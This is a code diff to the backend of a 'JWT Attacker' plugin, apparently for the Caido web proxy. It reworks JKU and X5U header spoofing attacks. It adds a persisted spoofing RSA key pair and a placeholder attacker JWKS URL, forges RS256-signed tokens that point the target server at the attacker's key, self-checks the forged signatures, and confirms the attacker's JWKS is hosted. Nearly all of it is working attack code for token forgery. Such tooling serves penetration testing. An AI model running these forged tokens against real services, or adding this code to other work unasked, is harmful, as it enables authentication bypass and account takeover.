@@ -110,6 +110,25 @@ function modpow(base, exp, mod) {
   }
   return result;
 }
+function verifyRS256WithJWK(token, nB64u, eB64u) {
+  try {
+    const parts = token.split(".");
+    if (parts.length !== 3) return false;
+    const nBuf = b64urlDecode(nB64u);
+    const n = nBuf.length ? BigInt("0x" + nBuf.toString("hex")) : 0n;
+    if (n === 0n) return false;
+    const eBuf = b64urlDecode(eB64u);
+    const e = eBuf.length ? BigInt("0x" + eBuf.toString("hex")) : 0n;
+    const sBuf = b64urlDecode(parts[2]);
+    const s = sBuf.length ? BigInt("0x" + sBuf.toString("hex")) : 0n;
+    const m = modpow(s, e, n);
+    const hash = createHash("sha256").update(`${parts[0]}.${parts[1]}`).digest();
+    const em = emsaPKCS1(hash, "sha256", nBuf.length);
+    return m === BigInt("0x" + em.toString("hex"));
+  } catch {
+    return false;
+  }
+}
 function emsaPKCS1(hash, hashAlg, keyLen) {
   const di = Buffer.from(DIGEST_INFO[hashAlg], "hex");
   const psLen = keyLen - 3 - di.length - hash.length;
@@ -450,38 +469,6 @@ ${lines}
 -----END PUBLIC KEY-----
 `;
 }
-function publicKey2jwk(keyPem) {
-  const b64 = keyPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
-  const der = Buffer.from(b64, "base64");
-  let offset = 0;
-  if (der[offset] !== 48) throw new Error("Not a SPKI SEQUENCE");
-  offset++;
-  const { next: outerBody } = derReadLength(der, offset);
-  offset = outerBody;
-  offset = derSkip2(der, offset);
-  if (der[offset] !== 3) throw new Error("Expected BIT STRING");
-  offset++;
-  const { next: bsBody } = derReadLength(der, offset);
-  offset = bsBody + 1;
-  if (der[offset] !== 48) throw new Error("Expected RSAPublicKey SEQUENCE");
-  offset++;
-  const { next: rsakBody } = derReadLength(der, offset);
-  offset = rsakBody;
-  if (der[offset] !== 2) throw new Error("Expected INTEGER for n");
-  offset++;
-  const { len: nLen, next: nBody } = derReadLength(der, offset);
-  const nBuf = der.slice(nBody, nBody + nLen);
-  offset = nBody + nLen;
-  if (der[offset] !== 2) throw new Error("Expected INTEGER for e");
-  offset++;
-  const { len: eLen, next: eBody } = derReadLength(der, offset);
-  const eBuf = der.slice(eBody, eBody + eLen);
-  return {
-    kty: "RSA",
-    n: b64urlEncode(nBuf),
-    e: b64urlEncode(eBuf)
-  };
-}
 function jwksToPublicKeys(jwks) {
   const pems = [];
   for (const jwk of jwks.keys) {
@@ -791,6 +778,8 @@ var DEFAULT_CONFIG = {
   customCertPem: "",
   jwksPaths: [...COMMON_JWKS_PATHS],
   customWordlist: [],
+  spoofPrivateKeyPem: "",
+  spoofJwksJson: "",
   enableKeyRecovery: false,
   enabledAttacks: {
     none: true,
@@ -1171,30 +1160,23 @@ function buildEmbeddedJWKAttacks(parsed, rsaKeyPair) {
 }
 
 // packages/backend/src/attacks/jkuSpoof.ts
-function buildJKUSpoofAttacks(parsed, config, rsaKeyPair) {
+var SPOOF_KID = "jwt-attacker-spoof-key";
+var PLACEHOLDER_URL = "https://YOUR-SERVER.example/.well-known/jwks.json";
+function buildJKUSpoofAttacks(parsed, config) {
   const results = [];
-  if (!config.jwksUrl) {
-    return { attacks: [], jwksContent: null, jwksKey: null };
+  if (!config.spoofPrivateKeyPem) {
+    return { attacks: [], jwksContent: config.spoofJwksJson || null, jwksKey: null };
   }
-  const kid = "jwt-attacker-spoof-key";
-  let privateKeyPem;
-  let publicJwk;
-  if (config.customPrivateKeyPem && config.customPublicKeyPem) {
-    privateKeyPem = config.customPrivateKeyPem;
-    publicJwk = publicKey2jwk(config.customPublicKeyPem);
-  } else {
-    const kp = rsaKeyPair ?? generateRSAKeyPair(2048);
-    privateKeyPem = kp.privateKeyPem;
-    publicJwk = kp.publicJwk;
-  }
-  const jwks = buildJWKSDocument({ ...publicJwk, kid }, kid);
-  const jwksContent = JSON.stringify(jwks, null, 2);
-  const jwksKey = privateKeyPem;
+  const privateKeyPem = config.spoofPrivateKeyPem;
+  const url = config.jwksUrl || PLACEHOLDER_URL;
+  const originalAlg = parsed.header.alg || "none";
+  const algNote = originalAlg === "RS256" ? "" : ` (algorithm switched ${originalAlg} \u2192 RS256)`;
+  const urlNote = config.jwksUrl ? "" : " \u26A0 Set the JWKS Endpoint URL in Configuration for a real test.";
   const sign = (extraHeader) => {
     const header = {
       ...parsed.header,
       alg: "RS256",
-      kid,
+      kid: SPOOF_KID,
       jwk: void 0,
       jku: void 0,
       x5u: void 0,
@@ -1203,29 +1185,35 @@ function buildJKUSpoofAttacks(parsed, config, rsaKeyPair) {
     };
     return signRSA(header, parsed.payload, privateKeyPem, "RS256");
   };
-  try {
-    results.push({
-      id: nanoid(),
-      technique: "jkuSpoof",
-      techniqueName: "JKU Spoofing (RS256)",
-      description: `Sets the jku header to ${config.jwksUrl} and signs with the generated private key. The server must be able to reach your JWKS endpoint. Host the generated JWKS JSON at that URL before sending this request.`,
-      modifiedJWT: sign({ jku: config.jwksUrl }),
-      timestamp: Date.now()
-    });
-  } catch {
+  if (config.enabledAttacks.jkuSpoof) {
+    try {
+      results.push({
+        id: nanoid(),
+        technique: "jkuSpoof",
+        techniqueName: `JKU Spoofing (RS256)${algNote ? " " + algNote.trim() : ""}`,
+        description: `Injects a jku header pointing at ${url} and signs with the persisted spoofing key${algNote}. Host the JWKS shown in the Configuration tab at that URL so the server fetches the attacker's key.` + urlNote,
+        modifiedJWT: sign({ jku: url }),
+        timestamp: Date.now(),
+        signingKeyPem: privateKeyPem
+      });
+    } catch {
+    }
   }
-  try {
-    results.push({
-      id: nanoid(),
-      technique: "x5uSpoof",
-      techniqueName: "X5U Spoofing (RS256)",
-      description: `Sets the x5u header to ${config.jwksUrl} and signs with the generated private key. Host the generated certificate / key at that URL.`,
-      modifiedJWT: sign({ x5u: config.jwksUrl }),
-      timestamp: Date.now()
-    });
-  } catch {
+  if (config.enabledAttacks.x5uSpoof) {
+    try {
+      results.push({
+        id: nanoid(),
+        technique: "x5uSpoof",
+        techniqueName: `X5U Spoofing (RS256)${algNote ? " " + algNote.trim() : ""}`,
+        description: `Injects an x5u header pointing at ${url} and signs with the persisted spoofing key${algNote}. Host the matching certificate / key at that URL.` + urlNote,
+        modifiedJWT: sign({ x5u: url }),
+        timestamp: Date.now(),
+        signingKeyPem: privateKeyPem
+      });
+    } catch {
+    }
   }
-  return { attacks: results, jwksContent, jwksKey };
+  return { attacks: results, jwksContent: config.spoofJwksJson || null, jwksKey: privateKeyPem };
 }
 
 // packages/backend/src/attacks/kidInject.ts
@@ -1727,13 +1715,11 @@ async function attackJwt(sdk, requestId, config) {
       `[JWT Attacker] enabled attacks: ${Object.entries(cfg.enabledAttacks).filter(([, v]) => v).map(([k]) => k).join(", ") || "(none)"}`
     );
     let rsaKeyPair;
-    const haveConfiguredKeyPair = !!(cfg.customPrivateKeyPem && cfg.customPublicKeyPem);
-    const needsKeyPair = cfg.enabledAttacks.embeddedJwk || !!cfg.jwksUrl && (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) && !haveConfiguredKeyPair;
-    if (needsKeyPair) {
+    if (cfg.enabledAttacks.embeddedJwk) {
       try {
         sdk.api.send("jwt-key-recovery-progress", {
           sessionId,
-          message: "Generating RSA key pair for JWK-injection attacks\u2026"
+          message: "Generating RSA key pair for the embedded-JWK attack\u2026"
         });
         rsaKeyPair = generateRSAKeyPair(2048);
       } catch (e) {
@@ -1759,17 +1745,6 @@ async function attackJwt(sdk, requestId, config) {
     if (cfg.enabledAttacks.weakSecret) {
       await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
     }
-    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
-      try {
-        const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, cfg, rsaKeyPair);
-        merge(spoofAttacks);
-        if (jwksContent && jwksKey) {
-          sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
-        }
-      } catch (e) {
-        errors.push(`[jkuSpoof] ${e.message}`);
-      }
-    }
     const httpGet = async (url) => {
       const getSpec = new RequestSpec(url);
       const sent = await sdk.requests.send(getSpec);
@@ -1780,6 +1755,66 @@ async function attackJwt(sdk, requestId, config) {
       const body = sent.response.getBody();
       return body ? bodyToText(body) : "";
     };
+    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
+      if (!cfg.spoofPrivateKeyPem || !cfg.spoofJwksJson) {
+        errors.push(
+          "[jkuSpoof] No spoofing key pair available \u2014 open the Configuration tab to generate one (the signing key must match the hosted jwks.json)."
+        );
+      } else {
+        try {
+          const { attacks: spoofAttacks } = buildJKUSpoofAttacks(parsed, cfg);
+          merge(spoofAttacks);
+          let selfVerified = false;
+          try {
+            const jwk = (JSON.parse(cfg.spoofJwksJson).keys ?? [])[0];
+            const jkuTok = spoofAttacks[0]?.modifiedJWT;
+            if (jwk?.n && jwk?.e && jkuTok) {
+              selfVerified = verifyRS256WithJWK(jkuTok, jwk.n, jwk.e);
+            }
+          } catch {
+          }
+          if (!selfVerified) {
+            errors.push("[jkuSpoof] Internal check failed: signed token did not validate against the configured JWKS.");
+          }
+          let verifyStatus = "no-url";
+          let verifyMessage = "";
+          let fetchedContent = "";
+          if (!cfg.jwksUrl) {
+            verifyStatus = "no-url";
+            verifyMessage = "No JWKS Endpoint URL configured \u2014 a placeholder was used in the tokens. Set the URL in Configuration and host the JWKS for a working test.";
+            errors.push(`[jkuSpoof] ${verifyMessage}`);
+          } else {
+            try {
+              fetchedContent = await httpGet(cfg.jwksUrl);
+              if (jwksContainsKey(fetchedContent, cfg.spoofJwksJson)) {
+                verifyStatus = "verified";
+                verifyMessage = `The JWKS hosted at ${cfg.jwksUrl} matches the spoofing key (kid="${SPOOF_KID}"). The jku/x5u tokens will validate against it.`;
+              } else {
+                verifyStatus = "mismatch";
+                verifyMessage = `The JWKS hosted at ${cfg.jwksUrl} does NOT contain the spoofing key (kid="${SPOOF_KID}"). Re-host the jwks.json shown in the Configuration tab.`;
+                errors.push(`[jkuSpoof] ${verifyMessage}`);
+              }
+            } catch (e) {
+              verifyStatus = "unreachable";
+              verifyMessage = `Could not fetch the JWKS Endpoint URL (${cfg.jwksUrl}): ${e.message}. Ensure the jwks.json is hosted there and reachable from Caido.`;
+              errors.push(`[jkuSpoof] ${verifyMessage}`);
+            }
+          }
+          sdk.api.send("jwks-spoof", {
+            sessionId,
+            jwksJson: cfg.spoofJwksJson,
+            privateKeyPem: cfg.spoofPrivateKeyPem,
+            url: cfg.jwksUrl || "(not configured)",
+            verifyStatus,
+            verifyMessage,
+            fetchedContent: fetchedContent.slice(0, 8192),
+            selfVerified
+          });
+        } catch (e) {
+          errors.push(`[jkuSpoof] ${e.message}`);
+        }
+      }
+    }
     if (cfg.enabledAttacks.algConfusion) {
       await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
         parsed,
@@ -1879,6 +1914,24 @@ async function getJWTsInRequest(sdk, requestId) {
   if (!reqResp) return [];
   return findJWTsInSpec(reqResp.request.toSpec());
 }
+async function generateSpoofKeyPair(_sdk) {
+  const kp = generateRSAKeyPair(2048);
+  const jwks = buildJWKSDocument({ ...kp.publicJwk, kid: SPOOF_KID }, SPOOF_KID);
+  return { privateKeyPem: kp.privateKeyPem, jwksJson: JSON.stringify(jwks, null, 2) };
+}
+function jwksContainsKey(hostedRaw, expectedRaw) {
+  try {
+    const hosted = JSON.parse(hostedRaw);
+    const expected = JSON.parse(expectedRaw);
+    const exp = expected.keys?.[0];
+    if (!exp) return false;
+    return (hosted.keys ?? []).some(
+      (k) => k.kty === exp.kty && k.n === exp.n && k.e === exp.e && k.kid === exp.kid
+    );
+  } catch {
+    return false;
+  }
+}
 var ALL_ATTACKS = [
   "none",
   "nullSig",
@@ -1905,6 +1958,8 @@ function normalizeConfig(raw) {
     customCertPem: typeof c.customCertPem === "string" ? c.customCertPem : "",
     jwksPaths: Array.isArray(c.jwksPaths) && c.jwksPaths.length ? c.jwksPaths : [...COMMON_JWKS_PATHS],
     customWordlist: Array.isArray(c.customWordlist) ? c.customWordlist : [],
+    spoofPrivateKeyPem: typeof c.spoofPrivateKeyPem === "string" ? c.spoofPrivateKeyPem : "",
+    spoofJwksJson: typeof c.spoofJwksJson === "string" ? c.spoofJwksJson : "",
     enableKeyRecovery: c.enableKeyRecovery === true,
     enabledAttacks
   };
@@ -2028,6 +2083,7 @@ function init(sdk) {
   sdk.console.log("[JWT Attacker] backend init() called");
   sdk.api.register("attackJwt", attackJwt);
   sdk.api.register("getJWTsInRequest", getJWTsInRequest);
+  sdk.api.register("generateSpoofKeyPair", generateSpoofKeyPair);
   sdk.console.log("[JWT Attacker] backend init() complete");
 }
 export {
